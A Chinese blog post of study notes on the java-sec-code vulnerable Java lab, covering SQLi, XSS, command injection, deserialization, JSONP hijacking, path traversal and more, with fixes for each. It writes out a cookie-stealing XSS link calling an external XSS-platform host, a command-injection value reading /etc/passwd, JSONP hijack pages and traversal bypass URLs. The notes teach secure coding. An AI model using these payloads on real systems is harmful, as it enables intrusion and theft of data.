<!DOCTYPE html>
<html lang="en">
  <head>
    
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">


<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="description" content="Java Sec Code学习笔记"/>




  <meta name="keywords" content="java," />





  <link rel="alternate" href="/default" title="glotozz'blog">




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />



<link rel="canonical" href="https://glotozz.github.io/2020/04/15/Java-Sec-Code学习笔记/"/>


<meta property="og:type" content="article">
<meta property="og:title" content="Java Sec Code学习笔记">
<meta property="og:url" content="https://glotozz.github.io/2020/04/15/Java-Sec-Code%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="glotozz&#39;blog">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2020/04/16/7NvFOJjtVXBrMue.png">
<meta property="og:image" content="https://i.loli.net/2020/04/16/31mqcAr869SHiQe.png">
<meta property="og:image" content="https://i.loli.net/2020/04/16/avZXDQkmwhFnKfO.png">
<meta property="og:image" content="https://i.loli.net/2020/04/16/tSTcHpyA9bYF8NO.png">
<meta property="og:image" content="https://i.loli.net/2020/04/16/vHSCbpOVAIaEt2n.png">
<meta property="og:image" content="https://i.loli.net/2020/04/16/o7Gx5acw96pgH4O.png">
<meta property="og:image" content="https://i.loli.net/2020/04/16/JcwWrLoEXaSnFUQ.png">
<meta property="og:image" content="https://i.loli.net/2020/04/16/ntLAr9U1fzKRWxs.png">
<meta property="og:image" content="https://i.loli.net/2020/04/16/OEbBFQf6dJ7WYL2.png">
<meta property="og:image" content="https://i.loli.net/2020/04/16/J1rPTZhly2HpkoU.png">
<meta property="og:image" content="https://i.loli.net/2020/04/16/ezA3UxvyWXmT1BD.png">
<meta property="og:image" content="https://i.loli.net/2020/04/16/lazbcoHnIWAhPNG.png">
<meta property="og:image" content="https://i.loli.net/2020/04/16/oyli8cPkvqwfFN9.png">
<meta property="og:image" content="https://i.loli.net/2020/04/16/gLZXd1sVpfm3C8Y.png">
<meta property="og:image" content="https://i.loli.net/2020/04/16/lqycUxT25DXheF7.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/HtsUPc9ngGCaQLx.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/Ns2C3xyGdEkeIHo.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/rdine8WRzp1qIQN.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/PNO1BQEj57bwphl.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/OkRcwqdBHgYWVMh.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/YkWt3bLfgpz7QGR.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/JoPm5nRBgIw8d1e.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/tObuKrJIDln8gv2.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/4WF23CQABK7fzN5.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/Ny5ZjpSB6l84o7e.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/hleZN6sbaqLrz3J.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/tCmENaVwGX2DPvM.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/moAvpud4iG1FK8x.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/WNZ1CvBwopGdxk3.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/hoCuQvLi9OmGZ1k.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/8PrjLsCGMbqWXeu.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/yQMJ42uEOX8aRkt.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/HGXjPi2tzbKfBq1.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/WEj8IgtMJwOZPaz.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/A4udl81PxGVZ9Io.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/9qmyEKwVhdbTLjB.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/Wqk4aVmLSvOuN7A.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/d2r9BatS1bkR7Wg.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/TM24o8KCBObdPNF.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/d6wqb8BxnouSKha.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/wFirZyX2DEHkWN1.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/s4DhiLcaOykCFWj.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/DbKS1zXEBGni4QL.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/uDNlgcKd6wm5haM.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/XGbs3HK2VktUawv.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/dmVbQOPi4D3zI8v.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/LSl93onZPIRMw4W.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/76lpjtNH1gC8FnR.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/qbe53o7kQp41BvX.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/5v3ibeJfCIFSsRE.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/25ipgXJv9fWNqCa.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/PJye8kzFMCfWX3I.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/h5GNtI47vFVcU9S.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/7wjmLtNqfzF8eAy.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/Tq4vabdyBhRGtIz.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/cmvGCogxUksZW2B.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/KDuYZwzsULd2INW.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/AU1vOecfSJFiHs9.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/KDw1sekqQrjd5ag.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/bCmIWagrAhcPotj.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/awOIF8qu6XJxLz7.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/u2hKDpBiXCmnGF7.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/1ds9DaNuonByItq.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/39lYEVPHnAS8bN2.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/6iT4ebqNMVL2Hk7.png">
<meta property="og:image" content="https://i.loli.net/2020/04/17/Qr9ymMRl872ifpK.png">
<meta property="article:published_time" content="2020-04-15T13:11:31.000Z">
<meta property="article:modified_time" content="2020-04-17T10:39:31.177Z">
<meta property="article:author" content="glotozz">
<meta property="article:tag" content="java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/04/16/7NvFOJjtVXBrMue.png">


<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>





<script type="text/javascript">
  var themeConfig = {
    fancybox: {
      enable: false
    },
  };
</script>




  


<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/song/media/outer/url?id=28592088.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="/57a2_fa12_13ff_c310c1889d0f14b24334ad7afef6b9b1.mp3"></iframe>--!>
<!--<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=0 height=0 src="https://music.163.com/outchain/player?type=2&id=574288806&auto=0&height=66"></iframe>--!>
    <title> Java Sec Code学习笔记 - glotozz'blog </title>
  <meta name="generator" content="Hexo 4.2.0"></head>

  <body>
    <div id="page">
      <header id="masthead"><div class="site-header-inner">
    <h1 class="site-title">
        <a href="/." class="logo">glotozz'blog</a>
    </h1>

    <nav id="nav-top">
        
            <ul id="menu-top" class="nav-top-items">
                
                    <li class="menu-item">
                        <a href="/archives">
                            
                            
                                Archives
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/about">
                            
                            
                                About
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/read">
                            
                            
                                Read
                            
                        </a>
                    </li>
                
                    <li class="menu-item">
                        <a href="/stars">
                            
                            
                                Stars
                            
                        </a>
                    </li>
                
            </ul>
        
  </nav>
</div>

      </header>
      <div id="content">
        
    <div id="primary">
        
  <article class="post">
    <header class="post-header">
      <h1 class="post-title">
        
          Java Sec Code学习笔记
        
      </h1>

      <time class="post-time">
          Apr 15 2020
      </time>
    </header>



    
            <div class="post-content">
            <meta name="referrer" content="no-referrer">
<a id="more"></a>

<p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p>
<!-- toc -->

<ul>
<li><a href="#环境搭建">环境搭建</a></li>
<li><a href="#预备知识">预备知识</a></li>
<li><a href="#sqli">SQLI</a></li>
<li><a href="#xss">XSS</a></li>
<li><a href="#文件上传漏洞">文件上传漏洞</a></li>
<li><a href="#ssti">SSTI</a></li>
<li><a href="#jsonp劫持">JSONP劫持</a></li>
<li><a href="#commandinject">CommandInject</a></li>
<li><a href="#反序列化漏洞">反序列化漏洞</a></li>
<li><a href="#fastjson漏洞">FastJson漏洞</a></li>
<li><a href="#路径穿越漏洞">路径穿越漏洞</a></li>
<li><a href="#getrequesturi">GetRequestURI</a></li>
<li><a href="#ip伪造">IP伪造</a></li>
<li><a href="#spel">SpEL</a></li>
<li><a href="#xstreamrce">XStreamRce</a></li>
<li><a href="#url重定向">URL重定向</a></li>
<li><a href="#ssrf">SSRF</a></li>
<li><a href="#xxe">XXE</a></li>
<li><a href="#总结">总结</a></li>
</ul>
<!-- tocstop -->

<hr>
<p>之前主要是分析一些java中影响较大的历史漏洞，大多都是框架层面的漏洞，前两天看到JoyChou师傅github上的项目，是一个java漏洞代码的靶场，包括常见漏洞代码和安全代码，值得细品。</p>
<h4><span id="环境搭建">环境搭建</span></h4><p><a href="https://github.com/JoyChou93/java-sec-code/blob/master/README_zh.md" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code/blob/master/README_zh.md</a> </p>
<p>该项目是基于spring框架开发，我搭建的方式选择idea搭建。</p>
<h4><span id="预备知识">预备知识</span></h4><p>在正式开始学习这个项目之前可以先简单学习下spring框架。</p>
<p><img src="https://i.loli.net/2020/04/16/7NvFOJjtVXBrMue.png" alt="Snipaste_2020-04-16_17-09-04.png"></p>
<p>虽然没用过spring框架，但是大致能看懂，先分析几个常规的文件。</p>
<p><code>Login.java</code></p>
<p><img src="https://i.loli.net/2020/04/16/31mqcAr869SHiQe.png" alt="Snipaste_2020-04-16_19-03-02.png"><code>Index.java</code></p>
<p><img src="https://i.loli.net/2020/04/16/avZXDQkmwhFnKfO.png" alt="Snipaste_2020-04-16_19-23-18.png"></p>
<h4><span id="sqli">SQLI</span></h4><p><strong>漏洞代码</strong></p>
<p><img src="https://i.loli.net/2020/04/16/tSTcHpyA9bYF8NO.png" alt="Snipaste_2020-04-16_19-38-09.png"></p>
<p>直接将用户传入<code>的username</code>拼接入sql语句</p>
<p><strong>漏洞测试</strong></p>
<p><img src="https://i.loli.net/2020/04/16/vHSCbpOVAIaEt2n.png" alt="Snipaste_2020-04-16_19-43-21.png"></p>
<p><strong>安全代码</strong></p>
<p><img src="https://i.loli.net/2020/04/16/o7Gx5acw96pgH4O.png" alt="Snipaste_2020-04-16_19-45-16.png"></p>
<p>采用预编译的形式可以防止sql注入</p>
<hr>
<h4><span id="xss">XSS</span></h4><p><strong>漏洞代码</strong></p>
<p><strong>反射型xss</strong></p>
<p><img src="https://i.loli.net/2020/04/16/JcwWrLoEXaSnFUQ.png" alt="Snipaste_2020-04-16_19-56-43.png"></p>
<p>对于用户输入的参数没有过滤直接返回给前端，导致反射性xss，可以通过构造恶意链接诱导用户访问，从而获取cookie等扩大危害。</p>
<p><strong>存储型xss</strong></p>
<p><img src="https://i.loli.net/2020/04/16/ntLAr9U1fzKRWxs.png" alt="Snipaste_2020-04-16_21-40-26.png"></p>
<p>对于用户输入的参数没有过滤直接保存到cookie中，读取的时候也没有经过处理导致前端解析的时候导致xss</p>
<p><strong>漏洞测试</strong></p>
<p>恶意链接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;xss&#x2F;reflect?xss&#x3D;%3CsCRiPt%20sRC&#x3D;&#x2F;&#x2F;xss.pt&#x2F;uJSf%3E%3C&#x2F;sCrIpT%3E</span><br></pre></td></tr></table></figure>

<p>测试了一下，能接收到请求，但是读不到cookie，查看cookie发现设置了<code>httponly</code></p>
<p><strong>安全代码</strong></p>
<p><img src="https://i.loli.net/2020/04/16/OEbBFQf6dJ7WYL2.png" alt="Snipaste_2020-04-16_22-09-36.png"></p>
<p>将一些特殊字符html实体编码防止xss</p>
<hr>
<h4><span id="文件上传漏洞">文件上传漏洞</span></h4><p>没有提供漏洞代码，但是可以参考上传图片功能的检查举一反三。</p>
<p><strong>安全代码</strong></p>
<p>两个函数</p>
<p><img src="https://i.loli.net/2020/04/16/J1rPTZhly2HpkoU.png" alt="Snipaste_2020-04-16_23-04-01.png"></p>
<p><code>convert()</code>先写入一个临时文件，为之后的内容检查做准备，<code>isImage()</code>判断是否是图片格式</p>
<p><img src="https://i.loli.net/2020/04/16/ezA3UxvyWXmT1BD.png" alt="Snipaste_2020-04-16_22-55-11.png"></p>
<p>获取一些文件属性</p>
<p><img src="https://i.loli.net/2020/04/16/lazbcoHnIWAhPNG.png" alt="Snipaste_2020-04-16_22-55-30.png"></p>
<p>后缀名检查</p>
<p><img src="https://i.loli.net/2020/04/16/oyli8cPkvqwfFN9.png" alt="Snipaste_2020-04-16_22-56-02.png"></p>
<p>MIME类型检查（个人认为MIME的意义不大）</p>
<p><img src="https://i.loli.net/2020/04/16/gLZXd1sVpfm3C8Y.png" alt="Snipaste_2020-04-16_22-56-51.png"></p>
<p>图片内容检查</p>
<p><img src="https://i.loli.net/2020/04/16/lqycUxT25DXheF7.png" alt="Snipaste_2020-04-16_23-03-02.png"></p>
<p>最后上传文件后将临时文件删除。</p>
<h4><span id="ssti">SSTI</span></h4><p><strong>漏洞代码</strong></p>
<p><img src="https://i.loli.net/2020/04/17/HtsUPc9ngGCaQLx.png" alt="Snipaste_2020-04-17_08-10-08.png"></p>
<p><strong>漏洞测试</strong></p>
<p><img src="https://i.loli.net/2020/04/17/Ns2C3xyGdEkeIHo.png" alt="Snipaste_2020-04-17_08-08-11.png"></p>
<p><strong>安全代码</strong></p>
<p><code>velocity.evaluate()</code>最新版本仍存在ssti，避免使用<code>velocity.evaluate()</code>方法</p>
<h4><span id="jsonp劫持">JSONP劫持</span></h4><p>用json来传数据，靠jsonp来跨域 </p>
<p><a href="https://drops.org.cn/PENETRATION/Json-with-Padding.html" target="_blank" rel="noopener">漏洞原理</a></p>
<p><strong>漏洞代码</strong></p>
<p><img src="https://i.loli.net/2020/04/17/rdine8WRzp1qIQN.png" alt="Snipaste_2020-04-17_09-25-04.png"></p>
<p>返回jsonp格式，注意这里的<code>this.callback=_callback</code>，当然这个例子即使param传错也能获取到数据</p>
<p><img src="https://i.loli.net/2020/04/17/PNO1BQEj57bwphl.png" alt="Snipaste_2020-04-17_09-42-49.png"></p>
<p>返回jsonp格式，没有处理referer为空的情况，并且空referer是可以被绕过的</p>
<p><img src="https://i.loli.net/2020/04/17/OkRcwqdBHgYWVMh.png" alt="Snipaste_2020-04-17_09-47-29.png"></p>
<p>返回Object(比如<code>JSONObject</code>或者<code>JavaBean</code>，但是不支持<code>Strin</code>g)，只要在参数中加入<code>callback=test</code>或<code>cback=test</code>就会自动变成jsonp接口。</p>
<p><img src="https://i.loli.net/2020/04/17/YkWt3bLfgpz7QGR.png" alt="Snipaste_2020-04-17_09-52-55.png"></p>
<p><code>CVE-2018-11040: Spring MappingJackson2JsonView</code>， 自动获取<code>jsonp</code>和<code>callback</code>参数使json数据自动转换成jsonp格式数据，支持跨域请求</p>
<p><strong>漏洞测试</strong></p>
<p>两种方式</p>
<p><code>ajax</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"JavaScript"</span>&gt;</span></span><br><span class="line"><span class="javascript">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">	$.ajax(&#123;</span></span><br><span class="line"><span class="actionscript">		url:<span class="string">'http://192.168.56.1:8080/vuln/emptyReferer'</span>,</span></span><br><span class="line"><span class="actionscript">		dataType:<span class="string">'jsonp'</span>,</span></span><br><span class="line"><span class="actionscript">		success:<span class="function"><span class="keyword">function</span><span class="params">(data)</span></span>&#123;</span></span><br><span class="line">			alert(data.name)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;script&gt;</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">	<span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">(data)</span></span>&#123;</span></span><br><span class="line">		alert(data.name);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://localhost:8080/jsonp/referer?callback</span>=<span class="string">test</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>空referer绕过</code></p>
<p>(为了测试方便，JSONP接口能直接访问，不直接访问做了Referer限制。正常来讲，前端发起的请求默认都会带着Referer) </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"referrer"</span> <span class="attr">content</span>=<span class="string">"no-referrer"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">	<span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">(data)</span></span>&#123;</span></span><br><span class="line">		alert(data.name);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://localhost:8080/jsonp/emptyReferer?callback</span>=<span class="string">test</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里<code>meta</code>标签中删除了<code>referer</code></p>
<p>靶场的有登录认证，因此就不继续测试了</p>
<p><strong>安全代码</strong></p>
<p><img src="https://i.loli.net/2020/04/17/JoPm5nRBgIw8d1e.png" alt="Snipaste_2020-04-17_10-39-58.png"></p>
<p><img src="https://i.loli.net/2020/04/17/tObuKrJIDln8gv2.png" alt="Snipaste_2020-04-17_10-41-55.png"></p>
<p><img src="https://i.loli.net/2020/04/17/4WF23CQABK7fzN5.png" alt="Snipaste_2020-04-17_10-42-05.png"></p>
<p><code>referer</code>为空也进行拦截</p>
<h4><span id="commandinject">CommandInject</span></h4><p><strong>漏洞代码</strong></p>
<p><img src="https://i.loli.net/2020/04/17/Ny5ZjpSB6l84o7e.png" alt="Snipaste_2020-04-17_10-45-51.png"></p>
<p>没有对用户输入进行处理拼接进<code>cmdList</code>，命令执行</p>
<p><img src="https://i.loli.net/2020/04/17/hleZN6sbaqLrz3J.png" alt="Snipaste_2020-04-17_10-49-12.png"></p>
<p>和上面的类似</p>
<p><strong>漏洞测试</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host:127.0.0.1;cat &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p><strong>安全代码</strong></p>
<p><img src="https://i.loli.net/2020/04/17/tCmENaVwGX2DPvM.png" alt="Snipaste_2020-04-17_11-15-06.png"></p>
<p><img src="https://i.loli.net/2020/04/17/moAvpud4iG1FK8x.png" alt="Snipaste_2020-04-17_11-15-49.png"></p>
<p><img src="https://i.loli.net/2020/04/17/WNZ1CvBwopGdxk3.png" alt="Snipaste_2020-04-17_11-18-48.png"></p>
<p>对传入的参数进行正则匹配，限制了字符集。</p>
<p>我感觉这个正则少了一个<code>\</code>，应该如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^[a-zA-Z0-9_\&#x2F;\\.-]+$</span><br></pre></td></tr></table></figure>

<h4><span id="反序列化漏洞">反序列化漏洞</span></h4><p><strong>漏洞代码</strong></p>
<p><img src="https://i.loli.net/2020/04/17/hoCuQvLi9OmGZ1k.png" alt="Snipaste_2020-04-17_11-31-49.png"></p>
<p><img src="https://i.loli.net/2020/04/17/8PrjLsCGMbqWXeu.png" alt="Snipaste_2020-04-17_11-49-51.png"></p>
<p>从cookie读取rememberMe字段对应的值，base64解密后进行反序列化，存在反序列化漏洞</p>
<p><strong>漏洞测试</strong></p>
<p>使用ysoserial生成CC5</p>
<p><img src="https://i.loli.net/2020/04/17/yQMJ42uEOX8aRkt.png" alt="Snipaste_2020-04-17_11-55-06.png"></p>
<p><strong>安全代码</strong></p>
<p><img src="https://i.loli.net/2020/04/17/HGXjPi2tzbKfBq1.png" alt="Snipaste_2020-04-17_11-55-59.png"></p>
<p><img src="https://i.loli.net/2020/04/17/WEj8IgtMJwOZPaz.png" alt="Snipaste_2020-04-17_12-02-18.png"></p>
<p><img src="https://i.loli.net/2020/04/17/A4udl81PxGVZ9Io.png" alt="Snipaste_2020-04-17_12-01-34.png"></p>
<p>项目中缓解的实现方法是写一个<code>ObjectInputStream</code>的子类，这个子类要重写<code>resolveClass()</code>，可以配置白名单或者黑名单。</p>
<p>Oracle最近引进<code>serialization filtering</code>来提高反序列化的安全性，它似乎结合了黑名单和白名单两种方式。新的反序列化过滤器被集成在JDK 9之中，这个特性已经被移植到更老的JDK之中了。<br>核心原理是，反序列化过滤基于<code>ObjectInputFilter</code>（ <a href="https://docs.oracle.com/javase/9/docs/api/java/io/ObjectInputFilter.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/9/docs/api/java/io/ObjectInputFilter.html</a> ）接口，这个接口提供一种配置能力 </p>
<h4><span id="fastjson漏洞">FastJson漏洞</span></h4><p><strong>漏洞代码</strong></p>
<p><img src="https://i.loli.net/2020/04/17/9qmyEKwVhdbTLjB.png" alt="Snipaste_2020-04-17_12-10-04.png"></p>
<p>以fastjson1.2.24为例，<code>parseObject()</code>方法调用的时候加上<code>Feature.SupportNonPublicField</code>且payload用户可控</p>
<p><strong>安全代码</strong></p>
<p>升级fastjson，避免使用危险配置参数</p>
<h4><span id="路径穿越漏洞">路径穿越漏洞</span></h4><p><strong>漏洞代码</strong></p>
<p><img src="https://i.loli.net/2020/04/17/Wqk4aVmLSvOuN7A.png" alt="Snipaste_2020-04-17_12-26-15.png"></p>
<p>没有对传入的文件路径进行检查</p>
<p><img src="https://i.loli.net/2020/04/17/d2r9BatS1bkR7Wg.png" alt="Snipaste_2020-04-17_12-26-45.png"></p>
<p><strong>安全代码</strong></p>
<p><img src="https://i.loli.net/2020/04/17/TM24o8KCBObdPNF.png" alt="Snipaste_2020-04-17_12-27-52.png"></p>
<p><img src="https://i.loli.net/2020/04/17/d6wqb8BxnouSKha.png" alt="Snipaste_2020-04-17_12-28-49.png"></p>
<p>先进行url解码，再设置<code>..</code>和<code>/</code>黑名单，防止路径穿越</p>
<h4><span id="getrequesturi">GetRequestURI</span></h4><p><strong>漏洞代码</strong></p>
<p><img src="https://i.loli.net/2020/04/17/wFirZyX2DEHkWN1.png" alt="Snipaste_2020-04-17_14-52-57.png"></p>
<p>一些开发人员对静态目录会放行，检测是否包含<code>/css/</code>字符串，不包含才校验权限。可以权限绕过</p>
<p><strong>漏洞测试</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;css&#x2F;%2e%2e&#x2F;uri&#x2F;exclued&#x2F;vuln</span><br><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;css&#x2F;..;&#x2F;uri&#x2F;exclued&#x2F;vuln</span><br><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;css&#x2F;..;&#x2F;uri&#x2F;bypasswaf&#x2F;exclued&#x2F;vuln</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/17/s4DhiLcaOykCFWj.png" alt="Snipaste_2020-04-17_14-53-52.png"></p>
<p><strong>安全代码</strong></p>
<p>将获取URI的方法换成<code>request.getServletPath();</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uri: &#x2F;css&#x2F;..&#x2F;hello    serlvetPath: &#x2F;hello</span><br><span class="line">uri: &#x2F;css&#x2F;%2e%2e&#x2F;hello    serlvetPath: &#x2F;hello</span><br></pre></td></tr></table></figure>

<h4><span id="ip伪造">IP伪造</span></h4><p><img src="https://i.loli.net/2020/04/17/DbKS1zXEBGni4QL.png" alt="Snipaste_2020-04-17_15-02-40.png"></p>
<p>用户可以伪造XFF头，因此ip不能从<code>X-Forwarded-For</code>获取</p>
<hr>
<h4><span id="spel">SpEL</span></h4><p><strong>漏洞代码</strong></p>
<p><img src="https://i.loli.net/2020/04/17/uDNlgcKd6wm5haM.png" alt="Snipaste_2020-04-17_15-10-39.png"></p>
<p>使用了<code>SpelExpressionParser()</code>方法，SpEL解析，下面有个相关的漏洞</p>
<blockquote>
<p><a href="https://www.cnblogs.com/litlife/p/10183137.html" target="_blank" rel="noopener">SpringBoot SpEL表达式注入漏洞</a></p>
</blockquote>
<p><strong>漏洞测试</strong></p>
<p><img src="https://i.loli.net/2020/04/17/XGbs3HK2VktUawv.png" alt="Snipaste_2020-04-17_15-15-44.png"></p>
<p><strong>安全代码</strong></p>
<p>使用<code>SimpleEvaluationContext()</code></p>
<h4><span id="xstreamrce">XStreamRce</span></h4><p><strong>漏洞代码</strong></p>
<p><img src="https://i.loli.net/2020/04/17/dmVbQOPi4D3zI8v.png" alt="Snipaste_2020-04-17_15-16-15.png"></p>
<p>使用XStream来解析xml，版本<code>1.4.10 or &lt;=1.4.6</code></p>
<p>相关的还有比如<code>s2-052</code>，漏洞在于使用REST插件的XStream组件进行反序列化XML时没有任何过滤，导致攻击者可以构造恶意xml payload导致RCE。 </p>
<p><strong>漏洞测试</strong></p>
<p>因此当前项目更新了版本，之后可以单独分析下<code>XStream漏洞</code></p>
<p><strong>安全代码</strong></p>
<p>更新XStream版本</p>
<h4><span id="url重定向">URL重定向</span></h4><p><strong>漏洞代码</strong></p>
<p><img src="https://i.loli.net/2020/04/17/LSl93onZPIRMw4W.png" alt="Snipaste_2020-04-17_15-38-43.png"></p>
